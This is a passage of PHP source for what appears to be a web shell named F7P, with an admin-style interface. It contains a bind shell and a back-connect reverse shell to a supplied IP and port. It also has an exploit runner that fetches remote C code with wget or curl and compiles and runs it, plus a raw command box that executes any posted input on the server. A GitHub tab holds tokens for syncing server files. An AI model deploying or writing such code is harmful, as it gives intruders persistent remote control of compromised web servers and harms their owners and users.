            exe($p2." bcp ".$ip." ".$port." &");
            $msg = "Connecting to ".$ip.":".$port." ...";
        }
        elseif (isset($_POST['expcompile']) && !empty($_POST['wurl']) && !empty($_POST['wcmd']))
        {
            $pilihan = trim($_POST['pilihan']);
            $wurl = trim($_POST['wurl']);
            $namafile = download($pilihan,$wurl);
            if(is_file($namafile)) {
                $msg = exe($wcmd);
            }
            else $msg = "File not found: $namafile";
        }
    ?>
        <table class="tabnet">
            <tr><th>Bind</th><th>Back</th><th>Exploit</th></tr>
            <tr>
            <td style="padding:6px;">
            <form method="post">
                <input class="inputz w-full" type="text" name="port" placeholder="Port" value="<?php echo $bindport; ?>" />
                <input class="inputz w-full" type="text" name="bind_pass" placeholder="Password" value="<?php echo $bindport_pass; ?>" />
                <select class="inputz w-full" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
                <input class="inputzbut w-full" type="submit" name="bind" value="Bind" />
            </form>
            </td>
            <td style="padding:6px;">
            <form method="post">
                <input class="inputz w-full" type="text" name="ip" placeholder="IP" value="<?php echo ((getenv('REMOTE_ADDR')) ? (getenv('REMOTE_ADDR')) : ("127.0.0.1")); ?>" />
                <input class="inputz w-full" type="text" name="backport" placeholder="Port" value="<?php echo $bindport; ?>" />
                <select class="inputz w-full" name="use"><option value="Perl">Perl</option><option value="C">C</option></select>
                <input class="inputzbut w-full" type="submit" name="backconn" value="Connect" />
            </form>
            </td>
            <td style="padding:6px;">
            <form method="post">
                <input class="inputz w-full" type="text" name="wurl" placeholder="URL" value="http://example.com/exploit.c" />
                <input class="inputz w-full" type="text" name="wcmd" placeholder="Command" value="gcc -o exp exp.c;./exp" />
                <select class="inputz w-full" name="pilihan">
                    <option value="wwget">wget</option>
                    <option value="wcurl">curl</option>
                    <option value="wget">GET</option>
                    <option value="wfread">fread</option>
                </select>
                <input class="inputzbut w-full" type="submit" name="expcompile" value="Run" />
            </form>
            </td>
            </tr>
        </table>
        <div style="text-align:center;margin:4px;font-size:14px;color:#0066cc;word-break:break-all;"><?php echo $msg; ?></div>
    <?php
    }
    elseif(isset($_GET['x']) && ($_GET['x'] == 'shell')){
    ?>
        <form action="?y=<?php echo $pwd; ?>&amp;x=shell" method="post">
            <textarea class="output" readonly style="height:350px;"><?php
            if(isset($_POST['submitcmd'])) {
                echo @exe($_POST['cmd']);
            }
            ?></textarea>
            <div class="cmd-row mt-2">
                <span style="font-size:12px;color:#666;flex-shrink:0;"><?php echo $prompt; ?></span>
                <input onMouseOver="this.focus();" id="cmd" class="inputz" type="text" name="cmd" placeholder="command..." value="" />
                <input class="inputzbut" type="submit" value="▶" name="submitcmd" />
            </div>
        </form>
    <?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'github')){
   
    $suggested_server_path = dirname($_SERVER['SCRIPT_FILENAME']) . DIRECTORY_SEPARATOR;
    
   
    if(isset($_POST['save_github_token'])){
        $token = trim($_POST['github_token']);
        $repo = trim($_POST['github_repo']);
        $branch = trim($_POST['github_branch']);
        $server_path = trim($_POST['github_server_path']);
        $github_path = trim($_POST['github_path']);
        $dir_mode = isset($_POST['dir_mode']) ? $_POST['dir_mode'] : 'single';
        $frontend_path = trim($_POST['frontend_path']);
        $backend_path = trim($_POST['backend_path']);
        ?>
        <script>
        localStorage.setItem('f7p_gh_token_9x7k2m', '<?php echo addslashes($token); ?>');
        localStorage.setItem('f7p_gh_repo_9x7k2m', '<?php echo addslashes($repo); ?>');
        localStorage.setItem('f7p_gh_branch_9x7k2m', '<?php echo addslashes($branch); ?>');
        localStorage.setItem('f7p_gh_server_path_9x7k2m', '<?php echo addslashes($server_path); ?>');
        localStorage.setItem('f7p_gh_path_9x7k2m', '<?php echo addslashes($github_path); ?>');
        localStorage.setItem('f7p_dir_mode_9x7k2m', '<?php echo addslashes($dir_mode); ?>');
        localStorage.setItem('f7p_frontend_path_9x7k2m', '<?php echo addslashes($frontend_path); ?>');
        localStorage.setItem('f7p_backend_path_9x7k2m', '<?php echo addslashes($backend_path); ?>');
        window.location.href = '?y=<?php echo $pwd; ?>&x=github&saved=1';
        </script>
        <?php
        exit;
    }
    ?>
    <div style="max-width:600px;margin:0 auto;">
        <h2 style="color:#0066cc;margin-bottom:16px;">GitHub API Settings <small>(saved on localStorage)</small></h2>
        <?php if(isset($_GET['saved'])): ?>
        <div style="background:#e6f7e6;padding:12px;border-radius:6px;margin-bottom:16px;color:#006600;">Settings saved successfully!</div>
        <?php endif; ?>
        
        <form method="post" action="?y=<?php echo $pwd; ?>&x=github" id="githubSettingsForm">
            <table class="tabnet">
                <tr>
                    <td style="width:120px;">Token</td>
                    <td><input class="inputz w-full" type="password" name="github_token" placeholder="ghp_xxxxxxxxxxxx" id="github_token" /></td>
                </tr>
                <tr>
                    <td>Repository</td>
                    <td><input class="inputz w-full" type="text" name="github_repo" placeholder="username/repo" id="github_repo" /></td>
                </tr>
                <tr>
                    <td>Branch</td>
                    <td><input class="inputz w-full" type="text" name="github_branch" placeholder="main" id="github_branch" value="main" /></td>
                </tr>
                <tr>
                    <td style="vertical-align:top;padding-top:12px;">Dir Mode</td>
                    <td>
                        <div style="display:flex;gap:20px;align-items:center;flex-wrap:wrap;">
                            <label style="cursor:pointer;display:flex;align-items:center;gap:6px;">
                                <input type="radio" name="dir_mode" value="single" checked onchange="toggleMultiDir(false)" />
                                Single Dir
                            </label>
                            <label style="cursor:pointer;display:flex;align-items:center;gap:6px;">
                                <input type="radio" name="dir_mode" value="multi" onchange="toggleMultiDir(true)" />
                                Multi Dir
                            </label>
                        </div>
                        <div style="font-size:12px;color:#666;margin-top:4px;">
                            All files in 1 directory or separate directory 
                        </div>
                    </td>
                </tr>
                <tr id="singleDirRow">
                    <td style="vertical-align:top;padding-top:12px;">GitHub Dir</td>
                    <td>
                        <input class="inputz w-full" type="text" name="github_path" placeholder="buku" id="github_path" />
                        <div style="font-size:12px;color:#666;margin-top:4px;">
                            Directory in Your Repository (for Single Dir mode)
                        </div>
                    </td>
                </tr>
                <tr id="multiDirRow" style="display:none;">
                    <td style="vertical-align:top;padding-top:12px;">Multi Dir</td>
                    <td>
                        <div style="display:flex;flex-direction:column;gap:8px;">
                            <div>
                                <label style="font-size:13px;font-weight:bold;color:#0066cc;">Your Frontend directory on GitHub</label>
                                <input class="inputz w-full" type="text" name="frontend_path" placeholder="frontend" id="frontend_path" />
                                <div style="font-size:11px;color:#888;margin-top:2px;">
                                    Auto detect on Edit Page: HTML, CSS, JS, Images, etc.
                                </div>
                            </div>
                            <div>
                                <label style="font-size:13px;font-weight:bold;color:#cc3333;">Your Backend directory on GitHub</label>
                                <input class="inputz w-full" type="text" name="backend_path" placeholder="backend" id="backend_path" />
                                <div style="font-size:11px;color:#888;margin-top:2px;">
                                    Auto detect on Edit Page: PHP, .htaccess, .env, config, etc.
                                </div>
                            </div>
                        </div>
                    </td>
                </tr>
                <tr>
                    <td style="vertical-align:top;padding-top:12px;">Server Path</td>
                    <td>
                        <input class="inputz w-full" type="text" name="github_server_path" 
                               placeholder="<?php echo htmlspecialchars($suggested_server_path); ?>" 
                               id="github_server_path" 
                               value="<?php echo htmlspecialchars($suggested_server_path); ?>" />
                        <div style="font-size:12px;color:#666;margin-top:4px;">
                            Full Directory link in this server<br>(suggested: <?php echo htmlspecialchars($suggested_server_path); ?>)
                        </div>
                    </td>
                </tr>
                <tr>
                    <td colspan="2" style="text-align:center;">
                        <input class="inputzbut" type="submit" name="save_github_token" value="Save Settings" style="width:100%;" />
                    </td>
                </tr>
            </table>
        </form>
        
        <script>
        function toggleMultiDir(isMulti) {
            var singleRow = document.getElementById('singleDirRow');
            var multiRow = document.getElementById('multiDirRow');
            if (singleRow && multiRow) {
                if (isMulti) {
                    singleRow.style.display = 'none';
                    multiRow.style.display = 'table-row';
                } else {
                    singleRow.style.display = 'table-row';
                    multiRow.style.display = 'none';
                }
            }
        }
        document.addEventListener('DOMContentLoaded', function() {
            var token = localStorage.getItem('f7p_gh_token_9x7k2m');
            var repo = localStorage.getItem('f7p_gh_repo_9x7k2m');
            var branch = localStorage.getItem('f7p_gh_branch_9x7k2m');
            var serverPath = localStorage.getItem('f7p_gh_server_path_9x7k2m');
            var githubPath = localStorage.getItem('f7p_gh_path_9x7k2m');
            var dirMode = localStorage.getItem('f7p_dir_mode_9x7k2m');
            var frontendPath = localStorage.getItem('f7p_frontend_path_9x7k2m');
            var backendPath = localStorage.getItem('f7p_backend_path_9x7k2m');
            if (token) document.getElementById('github_token').value = token;
            if (repo) document.getElementById('github_repo').value = repo;
            if (branch) document.getElementById('github_branch').value = branch;
            if (serverPath) document.getElementById('github_server_path').value = serverPath;
            if (githubPath) document.getElementById('github_path').value = githubPath;
            if (frontendPath) document.getElementById('frontend_path').value = frontendPath;
            if (backendPath) document.getElementById('backend_path').value = backendPath;
            if (dirMode === 'multi') {
                document.querySelector('input[name="dir_mode"][value="multi"]').checked = true;
                toggleMultiDir(true);
            } else {
                document.querySelector('input[name="dir_mode"][value="single"]').checked = true;
                toggleMultiDir(false);
            }
        });
        </script>
        
        <script src="f7p-assets/_github.js"></script>
        <?php
    }
    else {
        $buff = showdir($pwd,$prompt);
        echo $buff;
    }
    ?>
    </div>

<div id="footer">
    <span class="footer-item">
        <?php
        $os = strtolower(substr($system,0,3)) == "win" ? "🪟" : "🐧";
        echo $os;
        ?>
    </span>
    <span class="footer-item"> <span class="gaya"><?php echo $server_ip; ?></span></span>
    <span class="footer-item"><?php echo $system; ?></span>
</div>
<div class="bookmark-overlay">
    <button class="bookmark-toggle" id="bookmarkToggle">Shortcut</button>
    <div class="bookmark-dropdown" id="bookmarkDropdown">
        <div class="bookmark-header" id="bookmarkThis">📌 Bookmark this</div>
        <div class="bookmark-list" id="bookmarkList"></div>
    </div>
</div>
<script>
    var F7P_CONFIG = {
        currentPath: <?php echo json_encode($pwd); ?>,
        user: <?php echo json_encode($user); ?>,
        prompt: <?php echo json_encode($prompt); ?>,
        serverIp: <?php echo json_encode($server_ip); ?>,
        isWin: <?php echo $win ? 'true' : 'false'; ?>
    };
</script>
<script src="f7p-assets/_bookmark.js"></script>
<script class="proprietary">
// F7P - File 7ransfer Protocol
// core1: Aditya Kesuma, 2014
// core2: paxi@yahoo.com
// icons: Michal Bačík, Google Images
</script>
</body>
</html>